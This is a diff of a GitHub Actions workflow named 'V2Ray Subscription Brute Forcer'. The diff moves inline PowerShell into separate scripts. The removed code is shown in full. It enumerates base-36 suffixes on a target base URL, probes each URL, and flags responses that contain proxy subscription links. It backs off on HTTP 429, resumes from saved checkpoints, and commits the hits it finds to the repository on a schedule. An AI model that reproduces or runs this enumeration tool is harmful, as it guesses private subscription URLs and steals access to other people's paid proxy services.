@@ -92,290 +92,22 @@ jobs:
 
       # ============================================================
       # CHECKING INPUTS
-      #
-      # Manual run:
-      #   Load values from workflow_dispatch.
-      #
-      # Scheduled run:
-      #   Load values from last_runner_states.txt.
-      #
-      # Effective values are exposed as STEP OUTPUTS instead of
-      # GITHUB_ENV, so they are not displayed as environment
-      # variables in every following workflow step.
       # ============================================================
       - name: Checking Inputs
         id: load_inputs
         shell: powershell
-        run: |
-
-          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
-
-          $saved = @{
-              MODE                  = ""
-              FULL_URL              = ""
-              BASE_URL              = ""
-              SUFFIX_LENGTH         = ""
-              KNOWN_PREFIX          = ""
-              SEQUENTIAL_DIRECTION  = ""
-              GENERATED_POSITION    = ""
-              DELAY_MS              = ""
-              STOP_ON_HIT           = ""
-              LAST_CHECKPOINT       = ""
-          }
-
-          # ------------------------------------------------------------
-          # Read existing state file
-          # ------------------------------------------------------------
-          if (Test-Path $stateFile) {
-
-              foreach ($line in Get-Content $stateFile) {
-
-                  $line = $line.Trim()
-
-                  # Remove BOM / zero-width characters
-                  $line = $line -replace '^[\uFEFF\u200B\u200C\u200D]+', ''
-
-                  if ($line -match '^MODE=(.*)$') {
-                      $saved.MODE = $Matches[1]
-                  }
-                  elseif ($line -match '^FULL URL=(.*)$') {
-                      $saved.FULL_URL = $Matches[1]
-                  }
-                  elseif ($line -match '^BASE URL=(.*)$') {
-                      $saved.BASE_URL = $Matches[1]
-                  }
-                  elseif ($line -match '^SUFFIX LENGTH=(.*)$') {
-                      $saved.SUFFIX_LENGTH = $Matches[1]
-                  }
-                  elseif ($line -match '^KNOWN PREFIX=(.*)$') {
-                      $saved.KNOWN_PREFIX = $Matches[1]
-                  }
-                  elseif ($line -match '^SEQUENTIAL DIRECTION=(.*)$') {
-                      $saved.SEQUENTIAL_DIRECTION = $Matches[1]
-                  }
-                  elseif ($line -match '^GENERATED POSITION=(.*)$') {
-                      $saved.GENERATED_POSITION = $Matches[1]
-                  }
-                  elseif ($line -match '^DELAY MS=(.*)$') {
-                      $saved.DELAY_MS = $Matches[1]
-                  }
-                  elseif ($line -match '^STOP ON HIT=(.*)$') {
-                      $saved.STOP_ON_HIT = $Matches[1]
-                  }
-                  elseif ($line -match '^LAST CHECKPOINT=(.*)$') {
-                      $saved.LAST_CHECKPOINT = $Matches[1]
-                  }
-              }
-          }
-
-          # ------------------------------------------------------------
-          # Determine input source
-          # ------------------------------------------------------------
-          if ("${{ github.event_name }}" -eq "schedule") {
-
-              Write-Host "[MODE] Scheduled run."
-              Write-Host "[MODE] Loading latest inputs from last_runner_states.txt"
-              Write-Host ""
-
-              if ([string]::IsNullOrWhiteSpace($saved.MODE)) {
-                  Write-Host "[ERROR] No saved MODE found in last_runner_states.txt."
-                  Write-Host "[ERROR] Run the workflow manually once first."
-                  exit 1
-              }
-
-              $runMode = $saved.MODE
-              $runFullUrl = $saved.FULL_URL
-              $runBaseUrl = $saved.BASE_URL
-              $runCharCount = $saved.SUFFIX_LENGTH
-              $runKnownPrefix = $saved.KNOWN_PREFIX
-              $runSequentialDirection = $saved.SEQUENTIAL_DIRECTION
-              $runGeneratedPosition = $saved.GENERATED_POSITION
-              $runDelayMs = $saved.DELAY_MS
-              $runStopOnHit = $saved.STOP_ON_HIT
-
-          }
-          else {
-
-              Write-Host "[MODE] Manual run."
-              Write-Host "[MODE] Loading inputs from workflow_dispatch."
-              Write-Host ""
-
-              $runMode = "${{ inputs.mode }}"
-              $runFullUrl = "${{ inputs.full_url }}"
-              $runBaseUrl = "${{ inputs.base_url }}"
-              $runCharCount = "${{ inputs.charcount }}"
-              $runKnownPrefix = "${{ inputs.known_prefix }}"
-              $runSequentialDirection = "${{ inputs.sequential_direction }}"
-              $runGeneratedPosition = "${{ inputs.generated_position }}"
-              $runDelayMs = "${{ inputs.delay_ms }}"
-              $runStopOnHit = "${{ inputs.stop_on_hit }}"
-          }
-
-          # ------------------------------------------------------------
-          # Validate values
-          # ------------------------------------------------------------
-          if ([string]::IsNullOrWhiteSpace($runMode)) {
-              Write-Host "[ERROR] MODE is empty."
-              exit 1
-          }
-
-          if ([string]::IsNullOrWhiteSpace($runCharCount)) {
-              Write-Host "[ERROR] SUFFIX_LENGTH / charcount is empty."
-              exit 1
-          }
-
-          if ([string]::IsNullOrWhiteSpace($runSequentialDirection)) {
-              $runSequentialDirection = "Last digit first"
-          }
-
-          if ([string]::IsNullOrWhiteSpace($runGeneratedPosition)) {
-              $runGeneratedPosition = "Back of known prefix"
-          }
-
-          if ([string]::IsNullOrWhiteSpace($runDelayMs)) {
-              $runDelayMs = "500"
-          }
-
-          if ([string]::IsNullOrWhiteSpace($runStopOnHit)) {
-              $runStopOnHit = "true"
-          }
-
-          # ------------------------------------------------------------
-          # Display effective inputs
-          # ------------------------------------------------------------
-          Write-Host "============================================"
-          Write-Host "V2Ray Subscription Brute Forcer"
-          Write-Host "============================================"
-          Write-Host "Run Event             : ${{ github.event_name }}"
-          Write-Host "Mode                  : $runMode"
-          Write-Host "Full URL              : $runFullUrl"
-          Write-Host "Base URL              : $runBaseUrl"
-          Write-Host "Suffix length         : $runCharCount"
-          Write-Host "Known prefix          : $runKnownPrefix"
-          Write-Host "Sequential direction  : $runSequentialDirection"
-          Write-Host "Generated position    : $runGeneratedPosition"
-          Write-Host "Delay ms              : $runDelayMs"
-          Write-Host "Stop on hit           : $runStopOnHit"
-          Write-Host "============================================"
-          Write-Host ""
-
-          # ------------------------------------------------------------
-          # Expose effective inputs as STEP OUTPUTS.
-          #
-          # These are available to later steps through:
-          # steps.load_inputs.outputs.<name>
-          #
-          # They are NOT added to GITHUB_ENV, so they do not appear
-          # as RUN_* environment variables under every later step.
-          # ------------------------------------------------------------
-          "mode=$runMode" >> $env:GITHUB_OUTPUT
-          "full_url=$runFullUrl" >> $env:GITHUB_OUTPUT
-          "base_url=$runBaseUrl" >> $env:GITHUB_OUTPUT
-          "charcount=$runCharCount" >> $env:GITHUB_OUTPUT
-          "known_prefix=$runKnownPrefix" >> $env:GITHUB_OUTPUT
-          "sequential_direction=$runSequentialDirection" >> $env:GITHUB_OUTPUT
-          "generated_position=$runGeneratedPosition" >> $env:GITHUB_OUTPUT
-          "delay_ms=$runDelayMs" >> $env:GITHUB_OUTPUT
-          "stop_on_hit=$runStopOnHit" >> $env:GITHUB_OUTPUT
-
-      # ============================================================
-      # CREATE URL CHECKER
-      # ============================================================
-      - name: Create URL Checker Shell
-        shell: powershell
-        run: |
-          @'
-          param(
-              [string]$Uri,
-              [int]$Timeout = 2
-          )
-
-          $ErrorActionPreference = "Stop"
-
-          try {
-              $r = Invoke-WebRequest `
-                  -Uri $Uri `
-                  -UseBasicParsing `
-                  -TimeoutSec $Timeout `
-                  -UserAgent "Mozilla/5.0"
-
-              $c = $r.Content
-              $s = $c.Length
-
-              Write-Host "[RESPOND] HTTP $($r.StatusCode)  Size: $s"
-
-              $ok = $false
-
-              # ------------------------------------------------
-              # 1. Direct V2Ray / proxy subscription content
-              # ------------------------------------------------
-              if ($c -match "vless://|vmess://|trojan://|ss://|hysteria2?://|tuic://|anytls://|socks://") {
-                  $ok = $true
-              }
-
-              # ------------------------------------------------
-              # 2. Base64 encoded subscription
-              # ------------------------------------------------
-              elseif ($s -gt 1500 -and $c -match "^[A-Za-z0-9+/=`r`n]+$") {
-                  $ok = $true
-              }
-
-              # ------------------------------------------------
-              # 3. Subscription URL contained in response
-              # ------------------------------------------------
-              elseif (
-                  $c -match 'https?://[^"''<>\s]+/(?:api|sub|subscribe|subscription)/[^"''<>\s]+'
-              ) {
-                  $ok = $true
-              }
-
-              # ------------------------------------------------
-              # 4. Common subscription-page keywords
-              # ------------------------------------------------
-              elseif (
-                  $c -match "subscription" -or
-                  $c -match "subscribe" -or
-                  $c -match "traffic" -or
-                  $c -match "expire" -or
-                  $c -match "device"
-              ) {
-                  $ok = $true
-              }
-
-              # ------------------------------------------------
-              # Result
-              # ------------------------------------------------
-              if ($ok) {
-                  Write-Host "[VALID] Subscription detected."
-                  exit 0
-              }
-              else {
-                  Write-Host "[INVALID] Not a valid subscription response."
-                  exit 1
-              }
-          }
-          catch {
-
-              if (
-                  $_.Exception.Response -and
-                  [int]$_.Exception.Response.StatusCode -eq 429
-              ) {
-                  Write-Host "[RATE LIMITED]"
-                  exit 2
-              }
-
-              if ($_.Exception.Response) {
-                  $status = [int]$_.Exception.Response.StatusCode
-                  Write-Host "[ERROR] HTTP $status - $($_.Exception.Message)"
-              }
-              else {
-                  Write-Host "[ERROR] $($_.Exception.Message)"
-              }
-
-              exit 1
-          }
-
-          '@ | Set-Content -Path "$env:RUNNER_TEMP\v2ray_check.ps1" -Encoding UTF8
+        env:
+          GITHUB_EVENT_NAME_INPUT: ${{ github.event_name }}
+          INPUT_MODE: ${{ inputs.mode }}
+          INPUT_FULL_URL: ${{ inputs.full_url }}
+          INPUT_BASE_URL: ${{ inputs.base_url }}
+          INPUT_CHARCOUNT: ${{ inputs.charcount }}
+          INPUT_KNOWN_PREFIX: ${{ inputs.known_prefix }}
+          INPUT_SEQUENTIAL_DIRECTION: ${{ inputs.sequential_direction }}
+          INPUT_GENERATED_POSITION: ${{ inputs.generated_position }}
+          INPUT_DELAY_MS: ${{ inputs.delay_ms }}
+          INPUT_STOP_ON_HIT: ${{ inputs.stop_on_hit }}
+        run: .\.github\scripts\checking_inputs.ps1
 
       # ============================================================
       # TEST MODE
@@ -383,23 +115,9 @@ jobs:
       - name: Test Mode
         if: ${{ steps.load_inputs.outputs.mode == 'Test Mode' }}
         shell: powershell
-        run: |
-          $full = "${{ steps.load_inputs.outputs.full_url }}"
-
-          if ([string]::IsNullOrWhiteSpace($full)) {
-              Write-Host "[ERROR] No URL was entered."
-              exit 1
-          }
-
-          $fullUrl = $full
-
-          Write-Host ""
-          Write-Host "============================================"
-          Write-Host "[TEST] Trying: $fullUrl"
-          Write-Host "============================================"
-          Write-Host ""
-
-          & "$env:RUNNER_TEMP\v2ray_check.ps1" -Uri $fullUrl -Timeout 3 > $null 2>&1
+        env:
+          INPUT_FULL_URL: ${{ steps.load_inputs.outputs.full_url }}
+        run: .\.github\scripts\test_mode.ps1
 
       # ============================================================
       # SEQUENTIAL CHECKING
@@ -407,23 +125,10 @@ jobs:
       - name: Sequential Checking
         if: ${{ steps.load_inputs.outputs.mode == 'Sequential Mode' }}
         shell: powershell
-        run: |
-          $charCount = [int]"${{ steps.load_inputs.outputs.charcount }}"
-          $knownPrefix = "${{ steps.load_inputs.outputs.known_prefix }}"
-          $chars = "0123456789abcdefghijklmnopqrstuvwxyz"
-          $baseN = 36
-          $prefixLen = $knownPrefix.Length
-          $genLen = $charCount - $prefixLen
-
-          if ($genLen -lt 1) {
-              Write-Host "[ERROR] Known prefix is more than or equal to total suffix count."
-              exit 1
-          }
-
-          Write-Host "Total suffix count       : $charCount"
-          Write-Host "Known prefix count       : $prefixLen"
-          Write-Host "Characters to generate   : $genLen"
-          Write-Host ""
+        env:
+          INPUT_CHARCOUNT: ${{ steps.load_inputs.outputs.charcount }}
+          INPUT_KNOWN_PREFIX: ${{ steps.load_inputs.outputs.known_prefix }}
+        run: .\.github\scripts\sequential_checking.ps1
 
       # ============================================================
       # COMPARE INPUTS AND LAST CHECKPOINT
@@ -431,190 +136,29 @@ jobs:
       - name: Compare Inputs And Last Runner States
         if: ${{ steps.load_inputs.outputs.mode == 'Sequential Mode' }}
         shell: powershell
-        run: |
-      
-          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
-          $currentBase = "${{ steps.load_inputs.outputs.base_url }}"
-          $currentPrefix = "${{ steps.load_inputs.outputs.known_prefix }}"
-          $currentCharCount = "${{ steps.load_inputs.outputs.charcount }}"
-      
-          $savedBase = ""
-          $savedPrefix = ""
-          $savedCharCount = ""
-          $savedCheckpoint = ""
-      
-          if (Test-Path $stateFile) {
-      
-              foreach ($line in Get-Content $stateFile) {
-      
-                  # Remove whitespace and invisible Unicode characters at the beginning
-                  $line = $line.Trim()
-                  $line = $line -replace '^[\uFEFF\u200B\u200C\u200D]+', ''
-      
-                  if ($line.StartsWith("BASE URL=")) {
-                      $savedBase = $line.Substring("BASE URL=".Length).Trim()
-                  }
-                  elseif ($line.StartsWith("SUFFIX LENGTH=")) {
-                      $savedCharCount = $line.Substring("SUFFIX LENGTH=".Length).Trim()
-                  }
-                  elseif ($line.StartsWith("KNOWN PREFIX=")) {
-                      $savedPrefix = $line.Substring("KNOWN PREFIX=".Length).Trim()
-                  }
-                  elseif ($line.StartsWith("LAST CHECKPOINT=")) {
-                      $savedCheckpoint = $line.Substring("LAST CHECKPOINT=".Length).Trim()
-                  }
-              }
-      
-              $inputsMatch = (
-                  ($savedBase -eq $currentBase) -and
-                  ($savedPrefix -eq $currentPrefix) -and
-                  ($savedCharCount -eq $currentCharCount) -and
-                  (-not [string]::IsNullOrWhiteSpace($savedCheckpoint))
-              )
-      
-              if ($inputsMatch) {
-      
-                  $lastCheckpoint = $savedCheckpoint
-      
-                  Write-Host ""
-                  Write-Host "========== CHECKED LISTS =========="
-                  Write-Host "Base URL       : Matches"
-                  Write-Host "Suffix length  : Matches"
-                  Write-Host "Known prefix   : Matches"
-                  Write-Host "Last checkpoint: $lastCheckpoint"
-                  Write-Host "Action         : START FROM LAST CHECKPOINT"
-                  Write-Host "====================================="
-                  Write-Host ""
-              }
-              else {
-      
-                  $lastCheckpoint = ""
-      
-                  Write-Host ""
-                  Write-Host "========== CHECKED LISTS =========="
-      
-                  if ($savedBase -eq $currentBase) {
-                      Write-Host "Base URL       : Matches"
-                  }
-                  else {
-                      Write-Host "Base URL       : Not Matches"
-                  }
-      
-                  if ($savedCharCount -eq $currentCharCount) {
-                      Write-Host "Suffix length  : Matches"
-                  }
-                  else {
-                      Write-Host "Suffix length  : Not Matches"
-                  }
-      
-                  if ($savedPrefix -eq $currentPrefix) {
-                      Write-Host "Known prefix   : Matches"
-                  }
-                  else {
-                      Write-Host "Known prefix   : Not Matches"
-                  }
-      
-                  if ([string]::IsNullOrWhiteSpace($savedCheckpoint)) {
-                      Write-Host "Last checkpoint: NONE"
-                  }
-                  else {
-                      Write-Host "Last checkpoint: $savedCheckpoint"
-                  }
-      
-                  Write-Host "Action         : START FROM BEGINNING"
-                  Write-Host "====================================="
-                  Write-Host ""
-              }
-      
-          }
-          else {
-      
-              $lastCheckpoint = ""
-      
-              Write-Host ""
-              Write-Host "========== CHECKED LISTS =========="
-              Write-Host "No previous state file found."
-              Write-Host "Action         : START FROM BEGINNING"
-              Write-Host "====================================="
-              Write-Host ""
-          }
-      
-          # Export values for later workflow steps
-      
-          "CHECKPOINT_BASE=$currentBase" | Out-File `
-              -FilePath $env:GITHUB_ENV `
-              -Encoding utf8 -Append
-      
-          "CHECKPOINT_PREFIX=$currentPrefix" | Out-File `
-              -FilePath $env:GITHUB_ENV `
-              -Encoding utf8 -Append
-      
-          "CHECKPOINT_LENGTH=$currentCharCount" | Out-File `
-              -FilePath $env:GITHUB_ENV `
-              -Encoding utf8 -Append
-      
-          "CHECKPOINT_LAST=$lastCheckpoint" | Out-File `
-              -FilePath $env:GITHUB_ENV `
-              -Encoding utf8 -Append
+        env:
+          INPUT_BASE_URL: ${{ steps.load_inputs.outputs.base_url }}
+          INPUT_KNOWN_PREFIX: ${{ steps.load_inputs.outputs.known_prefix }}
+          INPUT_CHARCOUNT: ${{ steps.load_inputs.outputs.charcount }}
+        run: .\.github\scripts\compare_checkpoint.ps1
 
       # ============================================================
       # SAVE ALL CURRENT INPUTS
-      #
-      # This is AFTER Sequential input comparison so that when
-      # inputs change, CHECKPOINT_LAST has already been reset.
       # ============================================================
       - name: Save Current Inputs To State
         if: ${{ steps.load_inputs.outputs.mode == 'Sequential Mode' }}
         shell: powershell
-        run: |
-      
-          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
-      
-          $mode = "${{ steps.load_inputs.outputs.mode }}"
-          $fullUrl = "${{ steps.load_inputs.outputs.full_url }}"
-          $baseUrl = "${{ steps.load_inputs.outputs.base_url }}"
-          $charCount = "${{ steps.load_inputs.outputs.charcount }}"
-          $knownPrefix = "${{ steps.load_inputs.outputs.known_prefix }}"
-          $sequentialDirection = "${{ steps.load_inputs.outputs.sequential_direction }}"
-          $generatedPosition = "${{ steps.load_inputs.outputs.generated_position }}"
-          $delayMs = "${{ steps.load_inputs.outputs.delay_ms }}"
-          $stopOnHit = "${{ steps.load_inputs.outputs.stop_on_hit }}"
-      
-          $lastCheckpoint = $env:CHECKPOINT_LAST
-      
-          $stateContent = @"
-          MODE=$mode
-          FULL URL=$fullUrl
-          BASE URL=$baseUrl
-          SUFFIX LENGTH=$charCount
-          KNOWN PREFIX=$knownPrefix
-          SEQUENTIAL DIRECTION=$sequentialDirection
-          GENERATED POSITION=$generatedPosition
-          DELAY MS=$delayMs
-          STOP ON HIT=$stopOnHit
-          LAST CHECKPOINT=$lastCheckpoint
-          "@
-          
-              [System.IO.File]::WriteAllText(
-                  $stateFile,
-                  $stateContent,
-                  [System.Text.UTF8Encoding]::new($false)
-              )
-      
-          Write-Host ""
-          Write-Host "========== CURRENT STATE SAVED =========="
-          Write-Host "MODE                  : $mode"
-          Write-Host "FULL URL              : $fullUrl"
-          Write-Host "BASE URL              : $baseUrl"
-          Write-Host "SUFFIX LENGTH         : $charCount"
-          Write-Host "KNOWN PREFIX          : $knownPrefix"
-          Write-Host "SEQUENTIAL DIRECTION  : $sequentialDirection"
-          Write-Host "GENERATED POSITION    : $generatedPosition"
-          Write-Host "DELAY MS              : $delayMs"
-          Write-Host "STOP ON HIT           : $stopOnHit"
-          Write-Host "LAST CHECKPOINT       : $lastCheckpoint"
-          Write-Host "=========================================="
-          Write-Host ""
+        env:
+          INPUT_MODE: ${{ steps.load_inputs.outputs.mode }}
+          INPUT_FULL_URL: ${{ steps.load_inputs.outputs.full_url }}
+          INPUT_BASE_URL: ${{ steps.load_inputs.outputs.base_url }}
+          INPUT_CHARCOUNT: ${{ steps.load_inputs.outputs.charcount }}
+          INPUT_KNOWN_PREFIX: ${{ steps.load_inputs.outputs.known_prefix }}
+          INPUT_SEQUENTIAL_DIRECTION: ${{ steps.load_inputs.outputs.sequential_direction }}
+          INPUT_GENERATED_POSITION: ${{ steps.load_inputs.outputs.generated_position }}
+          INPUT_DELAY_MS: ${{ steps.load_inputs.outputs.delay_ms }}
+          INPUT_STOP_ON_HIT: ${{ steps.load_inputs.outputs.stop_on_hit }}
+        run: .\.github\scripts\save_state.ps1
 
       # ============================================================
       # SEQUENTIAL GENERATING
@@ -622,350 +166,18 @@ jobs:
       - name: Sequential Generating
         if: ${{ steps.load_inputs.outputs.mode == 'Sequential Mode' }}
         shell: powershell
-        run: |
-          $charCount = [int]"${{ steps.load_inputs.outputs.charcount }}"
-          $delayMs = [int]"${{ steps.load_inputs.outputs.delay_ms }}"
-          $knownPrefix = "${{ steps.load_inputs.outputs.known_prefix }}"
-          $direction = "${{ steps.load_inputs.outputs.sequential_direction }}"
-          $generatedPosition = "${{ steps.load_inputs.outputs.generated_position }}"
-          $base = "${{ steps.load_inputs.outputs.base_url }}"
-          $resultFile = "$env:GITHUB_WORKSPACE\found_subs.txt"
-          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
-          $chars = "0123456789abcdefghijklmnopqrstuvwxyz"
-          $baseN = 36
-          $stopOnHit = "${{ steps.load_inputs.outputs.stop_on_hit }}"
-
-          # ------------------------------------------------------------
-          # Clean existing result file
-          # ------------------------------------------------------------
-          if (Test-Path $resultFile) {
-
-              $uniqueResults = Get-Content -Path $resultFile |
-                  Where-Object { $_.Trim() -ne "" } |
-                  Select-Object -Unique
-
-              Set-Content -Path $resultFile -Value $uniqueResults
-          }
-
-          Write-Host "[STATUS] Stop on result hit: '$stopOnHit'"
-          Write-Host "[STATUS] Sequential direction: '$direction'"
-          Write-Host "[STATUS] Starting sequential checking..."
-
-          # ------------------------------------------------------------
-          # Calculate generated length
-          # ------------------------------------------------------------
-          $prefixLen = $knownPrefix.Length
-          $genLen = $charCount - $prefixLen
-
-          if ($genLen -lt 1) {
-              Write-Host "[ERROR] Known prefix is longer than or equal to total characters."
-              exit 1
-          }
-
-          # ------------------------------------------------------------
-          # Calculate total number of possible generated values
-          # ------------------------------------------------------------
-          $totalSequences = [math]::Pow($baseN, $genLen)
-          
-          # ------------------------------------------------------------
-          # Resume from previous checkpoint
-          # ------------------------------------------------------------
-          $seq = 0
-          $lastCheckpoint = $env:CHECKPOINT_LAST
-
-          if (-not [string]::IsNullOrWhiteSpace($lastCheckpoint)) {
-
-              $generatedPart = $lastCheckpoint
-
-              if ($generatedPosition -eq "Front of known prefix") {
-
-                  if ($knownPrefix -and $lastCheckpoint.EndsWith($knownPrefix)) {
-
-                      $generatedPart = $lastCheckpoint.Substring(
-                          0,
-                          $lastCheckpoint.Length - $knownPrefix.Length
-                      )
-                  }
-                  else {
-
-                      Write-Host "[RESUME] Checkpoint does not match the current known prefix."
-                      Write-Host "[RESUME] Starting from 0."
-                      $lastCheckpoint = ""
-                  }
-              }
-              else {
-
-                  if ($knownPrefix -and $lastCheckpoint.StartsWith($knownPrefix)) {
-
-                      $generatedPart = $lastCheckpoint.Substring(
-                          $knownPrefix.Length
-                      )
-                  }
-                  else {
-
-                      Write-Host "[RESUME] Checkpoint does not match the current known prefix."
-                      Write-Host "[RESUME] Starting from 0."
-                      $lastCheckpoint = ""
-                  }
-              }
-
-              if ($generatedPart.Length -ne $genLen) {
-
-                  Write-Host "[RESUME] Checkpoint length does not match current generated length."
-                  Write-Host "[RESUME] Starting from 0."
-                  $seq = 0
-              }
-              else {
-
-                  # ------------------------------------------------------
-                  # Convert checkpoint back to sequence number.
-                  #
-                  # Last digit first:
-                  #   000
-                  #   001
-                  #   002
-                  #
-                  # First digit first:
-                  #   000
-                  #   100
-                  #   200
-                  # ------------------------------------------------------
-                  $value = 0
-
-                  if ($direction -eq "Last digit first") {
-                  
-                      # Normal base-36 representation
-                      foreach ($ch in $generatedPart.ToCharArray()) {
-
-                          $idx = $chars.IndexOf($ch)
-
-                          if ($idx -lt 0) {
-                              Write-Host "[ERROR] Invalid character '$ch' in checkpoint."
-                              exit 1
-                          }
-
-                          $value = ($value * $baseN) + $idx
-                      }
-
-                  }
-                  else {
-                  
-                      # First digit changes fastest.
-                      # Reverse the positions when converting back.
-                      for ($i = $genLen - 1; $i -ge 0; $i--) {
-
-                          $ch = $generatedPart[$i]
-
-                          $idx = $chars.IndexOf($ch)
-
-                          if ($idx -lt 0) {
-                              Write-Host "[ERROR] Invalid character '$ch' in checkpoint."
-                              exit 1
-                          }
-
-                          $value = ($value * $baseN) + $idx
-                      }
-                  }
-
-                  $seq = $value + 1
-
-                  Write-Host "[RESUME] Previous checkpoint: $lastCheckpoint"
-                  Write-Host "[RESUME] Starting from sequence: $seq"
-              }
-          }
-          else {
-
-              Write-Host "[RESUME] No previous checkpoint."
-              Write-Host "[RESUME] Starting from sequence 0."
-          }
-
-          # ------------------------------------------------------------
-          # Sequential checking loop
-          # ------------------------------------------------------------
-          for ($test = 1; ; $test++) {
-
-          # --------------------------------------------------------
-          # Stop when the complete sequence has been generated
-          # --------------------------------------------------------
-          if ($seq -ge $totalSequences) {
-              Write-Host ""
-              Write-Host "[COMPLETE] All sequential values have been generated."
-              Write-Host "[COMPLETE] Total sequences checked: $totalSequences"
-              Write-Host "[STOP] No result found. Will stop current job and disabling workflow."
-      
-              gh workflow disable "${{ github.workflow }}"
-      
-              if ($LASTEXITCODE -ne 0) {
-                  Write-Host "[ERROR] Failed to disable workflow."
-                  exit 1
-              }
-      
-              Write-Host "[STOP] Workflow disabled successfully."
-              break
-          }
-      
-          $n = $seq
-
-              # Create generated part
-              $partChars = New-Object char[] $genLen
-
-              for ($i = 0; $i -lt $genLen; $i++) {
-
-                  $r = $n % $baseN
-                  $n = [math]::Floor($n / $baseN)
-
-                  if ($direction -eq "Last digit first") {
-                      # Last digit changes fastest
-                      $position = $genLen - 1 - $i
-
-                  }
-                  else {
-                      # First digit changes fastest
-                      $position = $i
-                  }
-
-                  $partChars[$position] = $chars[$r]
-              }
-
-              $part = -join $partChars
-
-              if ($generatedPosition -eq "Front of known prefix") {
-                  $suffix = $part + $knownPrefix
-              }
-              else {
-                  $suffix = $knownPrefix + $part
-              }
-
-              $fullUrl = $base + $suffix
-
-              # --------------------------------------------------------
-              # Check URL
-              # --------------------------------------------------------
-              $checkOutput = & "$env:RUNNER_TEMP\v2ray_check.ps1" -Uri $fullUrl -Timeout 3 2>&1
-              $checkResult = $LASTEXITCODE
-
-              # --------------------------------------------------------
-              # Delay
-              # --------------------------------------------------------
-              if ($delayMs -gt 0) {
-                  Start-Sleep -Milliseconds $delayMs
-              }
-
-              # --------------------------------------------------------
-              # Valid subscription found
-              # --------------------------------------------------------
-              if ($checkResult -eq 0) {
-
-                  Write-Host "[FOUND] $fullUrl"
-
-                  $existingResults = @()
-
-                  if (Test-Path $resultFile) {
-                      $existingResults = Get-Content -Path $resultFile
-                  }
-
-                  if ($existingResults -contains $fullUrl) {
-
-                      Write-Host "[DUPLICATE] Result already exists."
-
-                  }
-                  else {
-
-                      Add-Content -Path $resultFile -Value $fullUrl
-                      Write-Host "[SAVED] New result added."
-                  }
-
-                  # ----------------------------------------------------
-                  # Save latest checkpoint
-                  # ----------------------------------------------------
-                  $stateContent = @"
-          MODE=${{ steps.load_inputs.outputs.mode }}
-          FULL URL=${{ steps.load_inputs.outputs.full_url }}
-          BASE URL=${{ steps.load_inputs.outputs.base_url }}
-          SUFFIX LENGTH=${{ steps.load_inputs.outputs.charcount }}
-          KNOWN PREFIX=${{ steps.load_inputs.outputs.known_prefix }}
-          SEQUENTIAL DIRECTION=${{ steps.load_inputs.outputs.sequential_direction }}
-          GENERATED POSITION=${{ steps.load_inputs.outputs.generated_position }}
-          DELAY MS=${{ steps.load_inputs.outputs.delay_ms }}
-          STOP ON HIT=${{ steps.load_inputs.outputs.stop_on_hit }}
-          LAST CHECKPOINT=$suffix
-          "@
-          [System.IO.File]::WriteAllText(
-              $stateFile,
-              $stateContent,
-              [System.Text.UTF8Encoding]::new($false)
-          )
-
-                  # ----------------------------------------------------
-                  # STOP ON HIT
-                  # ----------------------------------------------------
-                  if ($stopOnHit -eq "true") {
-
-                      Write-Host "[STOP] Result found. Will stop current job and disabling workflow."
-
-                      gh workflow disable "${{ github.workflow }}"
-
-                      if ($LASTEXITCODE -ne 0) {
-                          Write-Host "[ERROR] Failed to disable workflow."
-                          exit 1
-                      }
-
-                      Write-Host "[STOP] Workflow disabled successfully."
-
-                      break
-                  }
-              }
-
-              # --------------------------------------------------------
-              # HTTP 429
-              # --------------------------------------------------------
-              elseif ($checkResult -eq 2) {
-
-                  Write-Host "[TOO MANY REQUESTS] Waiting 10 seconds to cool down..."
-
-                  Start-Sleep -Seconds 10
-
-                  # Do NOT increment $seq.
-                  # The same URL will be tested again.
-                  continue
-              }
-
-              # --------------------------------------------------------
-              # Not found / other error
-              # --------------------------------------------------------
-              else {
-
-                  Write-Host "[NOT FOUND] $suffix"
-              }
-
-              # --------------------------------------------------------
-              # ALWAYS save latest checkpoint
-              # --------------------------------------------------------
-              $stateContent = @"
-          MODE=${{ steps.load_inputs.outputs.mode }}
-          FULL URL=${{ steps.load_inputs.outputs.full_url }}
-          BASE URL=${{ steps.load_inputs.outputs.base_url }}
-          SUFFIX LENGTH=${{ steps.load_inputs.outputs.charcount }}
-          KNOWN PREFIX=${{ steps.load_inputs.outputs.known_prefix }}
-          SEQUENTIAL DIRECTION=${{ steps.load_inputs.outputs.sequential_direction }}
-          GENERATED POSITION=${{ steps.load_inputs.outputs.generated_position }}
-          DELAY MS=${{ steps.load_inputs.outputs.delay_ms }}
-          STOP ON HIT=${{ steps.load_inputs.outputs.stop_on_hit }}
-          LAST CHECKPOINT=$suffix
-          "@
-          
-          [System.IO.File]::WriteAllText(
-              $stateFile,
-              $stateContent,
-              [System.Text.UTF8Encoding]::new($false)
-          )
-
-              # --------------------------------------------------------
-              # Move to next sequence
-              # --------------------------------------------------------
-              $global:LASTEXITCODE = 0
-              $seq++
-          }
+        env:
+          INPUT_MODE: ${{ steps.load_inputs.outputs.mode }}
+          INPUT_FULL_URL: ${{ steps.load_inputs.outputs.full_url }}
+          INPUT_BASE_URL: ${{ steps.load_inputs.outputs.base_url }}
+          INPUT_CHARCOUNT: ${{ steps.load_inputs.outputs.charcount }}
+          INPUT_KNOWN_PREFIX: ${{ steps.load_inputs.outputs.known_prefix }}
+          INPUT_SEQUENTIAL_DIRECTION: ${{ steps.load_inputs.outputs.sequential_direction }}
+          INPUT_GENERATED_POSITION: ${{ steps.load_inputs.outputs.generated_position }}
+          INPUT_DELAY_MS: ${{ steps.load_inputs.outputs.delay_ms }}
+          INPUT_STOP_ON_HIT: ${{ steps.load_inputs.outputs.stop_on_hit }}
+          INPUT_WORKFLOW_NAME: ${{ github.workflow }}
+        run: .\.github\scripts\sequential_generating.ps1
 
       # ============================================================
       # UPDATE RESULTS AND LAST CHECKPOINT
@@ -976,19 +188,19 @@ jobs:
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-      
+
           git add found_subs.txt last_runner_states.txt
-      
+
           if ! git diff --cached --quiet; then
             git commit -m "Update brute forcer state"
-      
+
             echo "[INFO] Syncing with remote main before push..."
-      
+
             git fetch origin main
             git rebase origin/main
-      
+
             echo "[INFO] Pushing latest results and checkpoint..."
-      
+
             git push origin HEAD:main
           else
             echo "[INFO] No changes to commit."
